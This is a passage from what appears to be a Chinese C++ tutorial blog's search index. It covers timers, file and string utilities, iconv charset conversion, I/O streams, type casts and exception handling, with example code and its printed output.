(cltSocketInit != NULL) { void* handle = NULL; int result = cltSocketInit(&amp;handle); printf("result = %d", result); } // 释放动态链接库 if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} 任务调度定时器提示 基于 C++ 11 实现等价于 Javascript 的 setTimeout() 和 setInterval() 函数。 timer.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;#include &lt;atomic&gt;using namespace std;class Timer {public: typedef void(TimerFunction)();public: void setTimeout(TimerFunction, long delay); void setInterval(TimerFunction, long interval); void stop();private: atomic&lt;bool&gt; active{ true };};void Timer::setTimeout(TimerFunction function, long delay) { active = true; thread t([=]() { if (!active.load()) return; this_thread::sleep_for(chrono::milliseconds(delay)); if (!active.load()) return; function(); }); t.detach();}void Timer::setInterval(TimerFunction function, long interval) { active = true; thread t([=]() { while (active.load()) { this_thread::sleep_for(chrono::milliseconds(interval)); if (!active.load()) return; function(); } }); t.detach();}void Timer::stop() { active = false;} main.cpp 12345678910111213141516171819#include &lt;conio.h&gt;#include &lt;iostream&gt;#include "timer.h"using namespace std;void refreshConfig() { cout &lt;&lt; "execute refresh config ..." &lt;&lt; endl;}int main() { // 使用智能指针 unique_ptr&lt;Timer&gt; timer(new Timer()); Timer::TimerFunction* refreshFunc = refreshConfig; timer-&gt;setInterval(refreshConfig, 3000); timer-&gt;setTimeout(refreshConfig, 5000); _getch(); return 0;} 程序运行输出的结果如下： 12345execute refresh config ...execute refresh config ...execute refresh config ...execute refresh config ...execute refresh config ... 线程休眠sleep() 函数的功能是让程序的执行挂起一段时间，也就是等待一段时间再继续往下执行。 不同平台和不同编译器的区别 sleep() 函数在 Linux 平台的头文件是 unistd.h sleep() 函数在 Windows 平台的头文件是 windows.h sleep() 函数的名称是区分大小写的，有的编译器是大写，有的是小写 sleep() 函数休眠的时间，在 Windows 平台下是以 毫秒 为单位，而在 Linux 平台是以 秒 为单位 123456789101112131415// Windows平台的写法#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;windows.h&gt;int main(){ int a = 1; while (a) { printf("Welcome to songjiahao\'s blog\\n"); Sleep(1000); } system("pause"); return 0;} 文件处理创建文件夹提示 下述 C++ 代码兼容 Linux 与 Windows 平台，用于创建文件夹以及子文件夹 fileutil.h 123456789101112131415161718192021222324#pragma once#ifdef WIN32#include &lt;io.h&gt;#include &lt;direct.h&gt;#else#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#endif#ifdef WIN32#define ACCESS(fileName, accessMode) _access(fileName, accessMode)#define MKDIR(path) _mkdir(path)#else#define ACCESS(fileName, accessMode) access(fileName, accessMode)#define MKDIR(path) mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH)#endif#include &lt;iostream&gt;#define MAX_PATH_LEN 256using namespace std;int32_t createDirectory(const string &amp;dirPath); fileutil.cpp 123456789101112131415161718192021222324#include "fileutil.h"// 根据目录路径，从左到右依次判断目录是否存在，不存在则创建// 注意：最后一个如果是目录的话，则必须加上 \'\\\\\' 或者 \'/\'// 示例: /usr/local/scripts/int32_t createDirectory(const string &amp;dirPath) { uint32_t dirPathLen = dirPath.length(); if (dirPathLen &gt; MAX_PATH_LEN) { return -1; } char tmpDirPath[MAX_PATH_LEN] = {0}; for (uint32_t i = 0; i &lt; dirPathLen; ++i) { tmpDirPath[i] = dirPath[i]; if (tmpDirPath[i] == \'\\\\\' || tmpDirPath[i] == \'/\') { if (ACCESS(tmpDirPath, 0) != 0) { int32_t ret = MKDIR(tmpDirPath); if (ret != 0) { return ret; } } } } return 0;} 字符串处理分割字符串1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// 分割字符串// str: 要分割的字符串// delim: 分割字符vector&lt;string&gt; split(const string &amp;str, const char &amp;delim = \' \') { vector&lt;string&gt; tokens; size_t lastPos = str.find_first_not_of(delim, 0); size_t pos = str.find(delim, lastPos); while (lastPos != string::npos) { tokens.emplace_back(str.substr(lastPos, pos - lastPos)); lastPos = str.find_first_not_of(delim, pos); pos = str.find(delim, lastPos); } return tokens;}int main() { vector&lt;string&gt; strResult = split("Hello,World,!", \',\'); for (auto it = strResult.begin(); it != strResult.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; }} 程序运行输出的结果如下： 1Hello World ! 去除字符串两边的空格1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;// 去除字符串两边的空格void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);}int main() { string str = " hello "; trim(str); cout &lt;&lt; "str=" &lt;&lt; str &lt;&lt; endl; string str2 = str + "world"; cout &lt;&lt; "str2=" &lt;&lt; str2 &lt;&lt; endl;} 程序运行输出的结果如下： 12str=hellostr2=helloworld 判断字符串是否为空串12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;// 去除字符串两边的空格void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);}// 判断字符串是否为空串// "" -&gt; true// " " -&gt; true// "a" -&gt; false// " a " -&gt; falsebool empty(const string &amp;str) { if (str.empty()) { return true; } string strTemp = str; trim(strTemp); return strTemp.length() == 0;}int main() { string str1 = ""; string str2 = " "; string str3 = "a"; string str4 = " a "; cout &lt;&lt; (empty(str1) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str2) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str3) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str4) ? "true" : "false") &lt;&lt; endl;} 程序运行输出的结果如下： 1234truetruefalsefalse 转换字符集编码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 // Gb2312 转换 Utf8 编码// iInLen的长度不包括\'\\0\'字符，应该用strlen()，返回值是处理后的sOut长度int Gb2312ToUtf8(char *sOut, int iMaxOutLen, const char *sIn, int iInLen) { char *pIn = (char *) sIn; char *pOut = sOut; size_t ret; size_t iLeftLen = iMaxOutLen; iconv_t cd; cd = iconv_open("utf-8", "gb2312"); if (cd == (iconv_t) -1) { return -1; } size_t iSrcLen = iInLen; ret = iconv(cd, &amp;pIn, &amp;iSrcLen, &amp;pOut, &amp;iLeftLen); if (ret == (size_t) -1) { iconv_close(cd); return -1; } iconv_close(cd); return (iMaxOutLen - iLeftLen);}// Utf8 转换 Gb2312 编码// iInLen的长度不包括\'\\0\'字符，应该用strlen()，返回值是处理后的sOut长度int Utf8ToGb2312(char *sOut, int iMaxOutLen, const char *sIn, int iInLen) { char *pIn = (char *) sIn; char *pOut = sOut; size_t ret; size_t iLeftLen = iMaxOutLen; iconv_t cd; cd = iconv_open("gb2312", "utf-8"); if (cd == (iconv_t) -1) { return -1; } size_t iSrcLen = iInLen; ret = iconv(cd, &amp;pIn, &amp;iSrcLen, &amp;pOut, &amp;iLeftLen); if (ret == (size_t) -1) { iconv_close(cd); return -1; } iconv_close(cd); return (iMaxOutLen - iLeftLen);} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ 代码块"},{title:"C++ 进阶基础之四",url:"/posts/791ffdcd.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 标准 I/O 流的介绍I/O 流的概念程序的输入指的是从输入文件将数据传送给程序，程序的输出指的是从程序将数据传送给输出文件。C++ 的输入输出包含以下三个方面的内容： 对系统指定的标准设备的输入和输出：即从键盘输入数据，输出到显示器屏幕。这种输入输出称为标准的输入输出，简称 标准 I/O。 以外存磁盘文件为对象进行输入和输出：即从磁盘文件输入数据，数据输出到磁盘文件。以外存文件为对象的输入输出称为文件的输入输出，简称 文件 I/O。 对内存中指定的空间进行输入和输出：通常指定一个字符数组作为存储空间（实际上可以利用该内存空间存储任何信息）。这种输入和输出称为字符串输入输出，简称 串 I/O。 I/O 流类库的结构在 C 语言中，用 printf 和 scanf 进行输入输出，往往不能保证所输入输出的数据是可靠的安全的。在 C++ 的输入输出中，编译系统对数据类型进行严格的检查，凡是类型不正确的数据都不可能通过编译。因此 C++ 的 I/O 操作是类型安全（Type Safe）的。C++ 的 I/O 操作是可扩展的，不仅可以用来输入输出标准类型的数据，也可以用于用户自定义类型的数据。C++ 通过 I/O 类库来实现丰富的 I/O 功能。这样使 C++ 的输人输出明显地优于 C 语言中的 printf 和 scanf，但是也为之付出了代价，C++ 的 I/O 系统因此变得比较复杂，要掌握许多使用细节。C++ 编译系统提供了用于输入输出的 iostream 类库。iostream 这个单词是由 3 个部分组成的，即 i-o-stream，意为输入输出流。在 iostream 类库中包含许多用于输入输出的类，如下图所示： ios 是抽象基类，由它派生出 istream 类和 ostream 类，两个类名中第 1 个字母 i 和 o 分别代表输入（input）和输出（output）。istream 类支持输入操作，ostream 类支持输出操作，iostream 类支持输入输出操作。iostream 类是从 istream 类和 ostream 类通过多重继承而派生的类，其继承层次如下图所示： iostream 类库中不同的类的声明被放在不同的头文件中，用户在自己的程序中用 #include 命令包含了有关的头文件，这就相当于在本程序中声明了所需要用到的类。可以换 — 种说法：头文件是程序与类库的接口。iostream 类库的接口分别由不同的头文件来实现，常用的头文件如下： strstream：用于字符串流 I/O fstream：用于实现文件的 I/O 操作 iomanip：在使用格式化 I/O 时，应包含此头文件 iostream：包含了对输入输出流进行操作所需的基本信息 stdiostream：用于混合使用 C 语言和 C++ 的 I/O 机制，例如希望将 C 语言程序转变为 C++ 程序 在 iostream 头文件中定义的类有 ios，istream，ostream，iostream，istream_withassign，ostream_withassign，iostream_withassign 等。在 iostream 头文件中不仅定义了相关的类，还定义了 4 种标准 I/O 对象，如下所示： &lt;&lt; 和 &gt;&gt; 本来在 C++ 中是被定义为左位移运算符和右位移运算符的，由于在 iostream 头文件中对它们进行了重载，使它们能用作标准类型数据的输入和输出运算符。所以，在使用到它们的程序中必须用 #include &lt;iostream&gt; 命令将其包含到程序中。在 iostream 中只对 &lt;&lt; 和 &gt;&gt; 运算符用于标准类型数据的输入输出进行了重载，但未对用户声明的类型数据的输入输出进行重载。如果用户声明了新的类型，并希望用 &lt;&lt; 和 &gt;&gt; 运算符对其进行输入输出，则需要按照 C++ 的运算符重载规则来做。 标准 I/O 流的使用标准输入流的简单使用标准输入流对象 cin 的常用函数如下： cin.get()，一次只能读取一个字符 cin.get(一个参数)，读一个字符 cin.get(多个参数)，可以读字符串 cin.getline()，读取整行字符串，包括读取空格字符 cin.ignore()，用于忽略或清除输入缓冲区中的一个或多个字符 cin.putback()，将数据放回缓冲区 cin.peek()，返回值是一个 char 型的字符，即指针指向的当前字符，但它只是观测指针停留在当前的位置并不后移；如果要访问的字符是文件结束符，则函数的返回值是 EOF 或者 -1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;iostream&gt;using namespace std;void input1() { int number; cout &lt;&lt; "请输入一个数字: "; cin &gt;&gt; number; cout &lt;&lt; "输入的数字是: " &lt;&lt; number &lt;&lt; endl;}void input2() { char buf[1024]; cout &lt;&lt; "请输入字符串: "; cin &gt;&gt; buf; // 当遇到空格符时，会停止接收数据输入 cout &lt;&lt; "输入的字符串: "; cout &lt;&lt; buf &lt;&lt; endl;}void input3() { char ch; cout &lt;&lt; "请输入字符串: "; while ((ch = cin.get()) != EOF) // 如果缓冲区没有数据，则程序会阻塞 { cout &lt;&lt; ch &lt;&lt; " "; }}void input4() { char a, b, c; cout &lt;&lt; "请输入字符串: "; cin.get(a); // 如果缓冲区没有数据，则程序会阻塞 cin.get(b); cin.get(c); cout &lt;&lt; a &lt;&lt; b &lt;&lt; c;}void input5() { char buf[256]; cout &lt;&lt; "请输入字符串: "; cin.getline(buf, 256); // 当遇到空格符时，不会停止接收数据输入 cout &lt;&lt; buf &lt;&lt; endl;}void input6() { char buf1[256]; char buf2[256]; cout &lt;&lt; "请输入字符串:"; // 例如输入：abc efghi cin &gt;&gt; buf1; cin.ignore(2); // 忽略缓冲区的数据 cin.getline(buf2, 256); cout &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; buf2 &lt;&lt; endl;}void input7() { char buf1[256]; char buf2[256]; cout &lt;&lt; "请输入字符串:"; // 例如输入：abc efghi cin &gt;&gt; buf1; cin.ignore(2); int num = cin.peek(); // 查看缓冲区是否有数据 cout &lt;&lt; num &lt;&lt; endl; cin.getline(buf2, 256); cout &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; buf2 &lt;&lt; endl;}void input8() { // 分开处理输入的整数和字符 cout &lt;&lt; "Please, enter a number or a word: "; char c = std::cin.get(); if ((c &gt;= \'0\') &amp;&amp; (c &lt;= \'9\')) { int n; cin.putback(c); // 将数据放回缓冲区 cin &gt;&gt; n; cout &lt;&lt; "You entered a number: " &lt;&lt; n &lt;&lt; \'\\n\'; } else { char ch; cin.putback(c); // 将数据放回缓冲区 cin.get(ch); cout &lt;&lt; "You entered a character: " &lt;&lt; ch &lt;&lt; \'\\n\'; }} 标准输出流的简单使用标准输出流对象 cout 的常用函数如下： cout.flush() cout.put() cout.write() cout.width() cout.fill() cout.setf() 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;void output1() { cout.put(\'h\').put(\'e\').put(\'l\').put(\'l\').put(\'o\').put(\'\\n\');}void output2() { char* str = "hello world\\n"; cout.write(str, strlen(str));}void output3() { // 第一种方式：使用流对象的成员函数 cout &lt;&lt; "&lt;Start&gt;"; cout.width(30); cout.fill(\'*\'); cout.setf(ios::showbase); cout.setf(ios::internal); cout &lt;&lt; hex &lt;&lt; 123 &lt;&lt; "&lt;End&gt;\\n";}void output4() { // 第二种方式：使用控制符 cout &lt;&lt; "&lt;Start&gt;" &lt;&lt; setw(30) &lt;&lt; setfill(\'*\') &lt;&lt; setiosflags(ios::showbase) &lt;&lt; setiosflags(ios::internal) &lt;&lt; hex &lt;&lt; 123 &lt;&lt; "&lt;End&gt;\\n";}int main() { output1(); output2(); output3(); output4(); return 0;} 程序运行输出的结果如下： 1234hellohello world&lt;Start&gt;0x**************************7b&lt;End&gt;&lt;Start&gt;0x**************************7b&lt;End&gt; 文件 I/O 流的简单使用以普通的方式读写文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include "fstream"using namespace std;void writeFile() { // 打开文件 char* fname = "D:/file.txt"; ofstream fout(fname); if (fout) { fout &lt;&lt; "Hello World" &lt;&lt; endl; fout.flush(); fout.close(); }}void readFile() { // 读取文件 char ch; char* fname = "D:/file.txt"; ifstream fin(fname); if (fin) { while (fin.get(ch)) { cout &lt;&lt; ch; } fin.close(); }}void writeFileApp() { // 以追加的方式打开文件 char* fname = "D:/file.txt"; ofstream fout(fname, ios::app); if (fout) { fout &lt;&lt; "What" &lt;&lt; endl; fout.flush(); fout.close(); }}int main() { writeFile(); readFile(); writeFileApp(); readFile(); return 0;} 程序运行输出的结果如下： 123Hello WorldHello WorldWhat 以二进制的方式读写文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include "fstream"using namespace std;class Teacher {public: Teacher() { age = 33; strcpy(name, ""); } Teacher(int _age, char* _name) { age = _age; strcpy(name, _name); } void print() { cout &lt;&lt; "age:" &lt;&lt; age &lt;&lt; ", name:" &lt;&lt; name &lt;&lt; endl; }private: int age; char name[32];};int main() { char* fname = "D:/file.dat"; ofstream fout(fname, ios::binary); if (!fout) { cout &lt;&lt; "打开文件失败" &lt;&lt; endl; return 0; } // 将类对象写入二进制文件（序列化） Teacher t1(23, "Jim"); Teacher t2(26, "Tom"); fout.write((char*)&amp;t1, sizeof(Teacher)); fout.write((char*)&amp;t2, sizeof(Teacher)); fout.flush(); fout.close(); ifstream fin(fname); if (!fin) { cout &lt;&lt; "打开文件失败" &lt;&lt; endl; return 0; } // 从二进制文件读取类对象（反序列化） Teacher tmp; fin.read((char*)&amp;tmp, sizeof(Teacher)); tmp.print(); fin.read((char*)&amp;tmp, sizeof(Teacher)); tmp.print(); fin.close(); return 0;} 程序运行输出的结果如下： 12age:23, name:Jimage:23, name:Jim var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之三",url:"/posts/35cd91d3.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 类型转换类型转换的语法 C 语言风格的强制类型转换（Type Cast）很简单，不管什么类型的转换，语法都是：TYPE b = (TYPE) a C++ 风格的类型转换，提供了 4 种类型转换操作符来应对不同场合的应用 const_cast：去除变量的 const 只读属性 reinterpreter_cast：重新解释类型（强制类型转换） static_cast：静态类型转换，如 int 转换成 char dynamic_cast：动态类型转换，如父类和子类之间的多态类型转换 C++ 4 种类型转换的语法：TYPE B = static_cast&lt;TYPE&gt; (a) 类型转换的一般性介绍一般性介绍： a) const_cast&lt;&gt;()：去除变量的 const 只读属性 b) reinterpret_cast&lt;&gt;()：重新解释类型，不同类型之间会进行强制类型转换 c) dynamic_cast&lt;&gt;()：动态类型转换，安全的基类和派生类之间转换，运行时会做类型检查 d) static_cast&lt;&gt;()：静态类型转换，编译的时候 C++ 编译器会做类型检查，基本类型都能转换，但是不能转换指针类型（多态除外） 一般性结论： a) 在 C 语言中，不能隐式类型转换的，在 C++ 中可以用 reinterpret_cast&lt;&gt;() 进行强行类型解释 b) 在 C 语言中，能隐式类型转换的，在 C++ 中可用 static_cast&lt;&gt;() 进行类型转换，因为 C++ 编译器在编译的时候，一般都可以顺利通过类型检查 c) static_cast&lt;&gt;() 和 reinterpret_cast&lt;&gt;() 基本上把 C 语言中的强制类型转换功能给覆盖了，但 reinterpret_cast&lt;&gt;() 很难保证代码的移植性 类型转换的简单使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;iostream&gt;using namespace std;class Tree {};class Animal {public: virtual void cry() = 0;};class Dog : public Animal {public: void cry() override { cout &lt;&lt; "dog cry ..." &lt;&lt; endl; } void watchHome() { cout &lt;&lt; "dog watch home" &lt;&lt; endl; }};class Cat : public Animal {public: void cry() override { cout &lt;&lt; "cat cry ..." &lt;&lt; endl; } void playBall() { cout &lt;&lt; "cat play ball ..." &lt;&lt; endl; }};void playAnimal(Animal *animal) { animal-&gt;cry(); // 动态类型转换，将父类转换为子类，运行时会做类型检查 Dog *dog = dynamic_cast&lt;Dog *&gt;(animal); if (dog != NULL) { dog-&gt;watchHome(); } Cat *cat = dynamic_cast&lt;Cat *&gt;(animal); if (cat != NULL) { cat-&gt;playBall(); }}void printBuf(const char *buf) { // const_cast 去除变量的 const 只读属性 char *m_buf = const_cast&lt;char *&gt;(buf); m_buf[0] = \'b\'; cout &lt;&lt; buf &lt;&lt; endl; cout &lt;&lt; m_buf &lt;&lt; endl;}void printBuf2() { // 定义指针指向一个常量，这里的常量的内存空间不可以更改 char* buf = "aaaaa"; // const_cast 去除变量的 const 只读属性 char* m_buf = const_cast&lt;char*&gt;(buf); // 此时若更改指针所指向的内存空间，会带来灾难性的后果 m_buf[0] = \'b\'; cout &lt;&lt; buf &lt;&lt; endl; cout &lt;&lt; m_buf &lt;&lt; endl;}int main() { char *p1 = "hello"; double pi = 3.1415926; // 静态类型转换，编译的时候 C++ 编译器会做类型检查 int num1 = static_cast&lt;int&gt;(pi); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // 静态类型转换，基本类型都能转换，但是不能转换指针类型（多态除外） // int* p2 = static_cast&lt;int*&gt;(p1); // 错误写法，C++ 编译器编译失败 // 重新解释类型，不同类型之间会进行强制类型转换，包括转换指针类型 int *p2 = reinterpret_cast&lt;int *&gt;(p1); cout &lt;&lt; "p2 = " &lt;&lt; p2 &lt;&lt; endl; // 去除变量的 const 只读属性 char buf[] = "aaaaa"; printBuf(buf); // printBuf2(); // 动态类型转换，基类和派生类之间转换，运行时会做类型检查 Dog dog; Cat cat; playAnimal(&amp;dog); playAnimal(&amp;cat); // 多态的其他使用场景 Animal *pAnimal = NULL; pAnimal = &amp;dog; pAnimal = static_cast&lt;Animal *&gt;(&amp;dog); // 编译通过 pAnimal-&gt;cry(); pAnimal = reinterpret_cast&lt;Animal *&gt;(&amp;dog); // 编译通过 pAnimal-&gt;cry(); Tree tree; // pAnimal = static_cast&lt;Animal*&gt;(&amp;tree); // 错误写法，C++ 编译器编译失败 pAnimal = reinterpret_cast&lt;Animal *&gt;(&amp;tree); // 编译通过 return 0;} 程序运行输出的结果如下： 12345678910num1 = 3p2 = 005661B8baaaabaaaadog cry ...dog watch homecat cry ...cat play ball ...dog cry ...dog cry ... 使用总结： 一般情况下，不建议进行类型转换，应该避免进行类型转换 要清楚地知道：要转换的变量，类型转换前是什么类型，类型转换后是什么类型，转换后有什么后果 异常处理机制 异常的介绍： 异常是一种程序控制机制，与函数机制独立和互补 函数是一种以栈结构展开的上下函数衔接的程序控制系统，而异常是另一种控制结构，它依附于栈结构，却可以同时设置多个异常类型作为捕获条件，从而实现以类型匹配在栈机制中跳跃回馈 异常设计目的： 栈机制是一种高度节律性的控制机制，面向对象编程却要求对象之间有方向、有目的的控制传动，从一开始，异常就是冲着改变程序控制结构，以适应面向对象程序更有效地工作这个主题，而不是仅为了进行错误处理 异常设计出来之后，却发现在错误处理方面获得了最大的好处 异常处理的基本思想传统错误处理机制传统的程序错误处理机制，是通过函数返回值来处理错误。 异常处理的基本思想 异常跨越了函数，并超脱于函数机制，决定了其对函数的跨越式回跳 C++ 的异常处理机制使得异常的引发和异常的处理不必在同一个函数中，这样底层的函数可以着重解决具体问题，而不必过多的考虑异常的处理，上层调用者可以在适当的位置设计对不同类型异常的处理 异常是专门针对抽象编程中的一系列错误进行处理的，C++ 中不能借助函数机制，因为栈结构的本质是先进后出，依次访问，无法进行跳跃，但错误处理的特征却是遇到错误信息就想要转到若干级之上进行重新尝试，如图所示： C++ 异常的基础使用异常的基本语法 a) 若有异常则通过 throw 操作创建一个异常对象并抛掷 b) 将可能抛出异常的程序段嵌在 try 块之中，控制通过正常的顺序执行到达 try 语句，然后执行 try 代码块内的保护段 c) 如果在保护段执行期间没有引起异常，那么跟在 try 代码块后的 catch 子句就不会执行，程序从 try 代码块后跟随的最后一个 catch 子句后面的语句将继续执行下去 d) catch 子句按其在 try 代码块后出现的顺序被检查，匹配到的 catch 子句将捕获并处理异常（或继续抛掷异常） e) 如果匹配的异常处理器未被找到，则函数 terminate() 将被自动调用，其缺省功能是调用函数 abort() 终止程序的运行 f) 处理不了的异常，可以在 catch 子句的最后一个分支，使用 throw 语法，向上抛掷异常 异常的简单使用案例一123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int divide(int x, int y) { if (0 == y) { throw y; // 抛出 int 类型的异常 } return x / y;}int main() { try { int result = divide(5, 0); cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; } catch (int e) { cout &lt;&lt; e &lt;&lt; ", 被除数不能为零" &lt;&lt; endl; } // 会捕获所有未被捕获的异常，必须最后出现 catch (...) { throw "发生未知的异常 ..."; } cout &lt;&lt; "程序正常结束运行" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 120, 被除数不能为零程序正常结束运行 异常的简单使用案例二异常机制与函数机制互不干涉，但捕捉的方式是基于类型匹配。异常捕捉相当于函数返回类型的匹配，而不是函数参数的匹配，所以异常捕捉不用考虑一个抛掷中的多种数据类型匹配问题。异常捕捉是严格按照类型匹配的，它的类型匹配之苛刻程度可以和模板的类型匹配相媲美。它不允许相容类型的隐式转换，比如，抛掷 char 类型的异常，用 int 类型就捕捉不到对应的异常。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;class A {};class B {};int main() { try { int a; int i = 0; double d = 2.3; char str[20] = "Hello"; cout &lt;&lt; "Please input a exception number: "; cin &gt;&gt; a; switch (a) { case 1: throw i; case 2: throw d; case 3: throw str; case 4: throw A(); case 5: throw B(); default: cout &lt;&lt; "No exception throws here.\\n"; } } catch (int) { cout &lt;&lt; "int exception.\\n"; } catch (double) { cout &lt;&lt; "double exception.\\n"; } catch (char*) { cout &lt;&lt; "char* exception.\\n"; } catch (A) { cout &lt;&lt; "class A exception.\\n"; } catch (B) { cout &lt;&lt; "class B exception.\\n"; } cout &lt;&lt; "That\'s ok.\\n"; return 0;} 程序运行输出的结果如下： 123Please input a exception number: 3char* exception.That\'s ok. 异常在继承中的使用案例 MyException.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#pragma once#include &lt;iostream&gt;using namespace std;// 异常抽象类class SizeException {public: // 纯虚函数 virtual void printErr() = 0;public: int getSize() { return this-&gt;size; }protected: int size = 0;};class NegativeException : public SizeException {public: NegativeException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "数组大小不能小于零, 当前大小为 " &lt;&lt; this-&gt;size &lt;&lt; endl; }};class TooBigException : public SizeException {public: TooBigException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "数组大小太大, 当前大小为 " &lt;&lt; this-&gt;size &lt;&lt; endl; }};class ZeroException : public SizeException {public: ZeroException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "数组大小不允许为零" &lt;&lt; endl; }}; MyArray.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#pragma once#include &lt;iostream&gt;#include "MyException.h"using namespace std;class MyArray {public: // 构造函数 MyArray(int size) { // 数组初始化大小检查，大小不合法则抛出异常 if (size &lt; 0) { throw NegativeException(size); } else if (size == 0) { throw ZeroException(size); } else if (size &gt; this-&gt;m_max_size) { throw TooBigException(size); } this-&gt;m_size = size; this-&gt;m_space = new int[size]; } // 拷贝构造函数 MyArray(const MyArray&amp; obj) { // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new int[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } } // 析构函数 ~MyArray() { if (this-&gt;m_space) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_size = 0; } }public: // 使用类成员函数，重载运算符 "[]" int&amp; operator[](int index) { return this-&gt;m_space[index]; } // 使用类成员函数，重载运算符 "=" MyArray&amp; operator=(const MyArray&amp; obj) { // 释放原本的内存空间 if (this-&gt;m_space) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_size = 0; } // 深拷贝 this-&gt;m_size = obj.m_size; this-&gt;m_space = new int[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } return *this; } // 使用友元函数，重载运算符 "&lt;&lt;" friend ostream&amp; operator&lt;&lt;(ostream&amp; out, const MyArray&amp; obj);public: int getsize() { return m_size; }private: int* m_space; int m_size; int m_max_size = 1000;};// 使用友元函数，重载运算符 "&lt;&lt;"ostream&amp; operator&lt;&lt;(ostream&amp; out, const MyArray&amp; obj) { for (int i = 0; i &lt; obj.m_size; i++) { out &lt;&lt; obj.m_space[i] &lt;&lt; ", "; } return out;} main.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142#include "MyArray.h"int main() { try { // 调用构造函数 MyArray array1(-6); // MyArray array1(5); // MyArray array1(0); // MyArray array1(2000); // 重载运算符 "[]" for (int i = 0; i &lt; array1.getsize(); i++) { array1[i] = 20 + i; } // 重载运算符 "&lt;&lt;" cout &lt;&lt; array1 &lt;&lt; endl; // 调用拷贝构造函数 MyArray array2 = array1; cout &lt;&lt; array2 &lt;&lt; endl; MyArray array3(3); array3[0] = 43; array3[1] = 56; array3[2] = 79; cout &lt;&lt; array3 &lt;&lt; endl; // 重载运算符 "=" array3 = array2; cout &lt;&lt; array3 &lt;&lt; endl; } // 使用引用捕获异常（多态） catch (SizeException&amp; e) { e.printErr(); } catch (...) { cout &lt;&lt; "发生未知异常" &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1数组大小不能小于零, 当前大小为 -6 C++ 异常的进阶使用栈解旋异常被抛出后，从进入 try 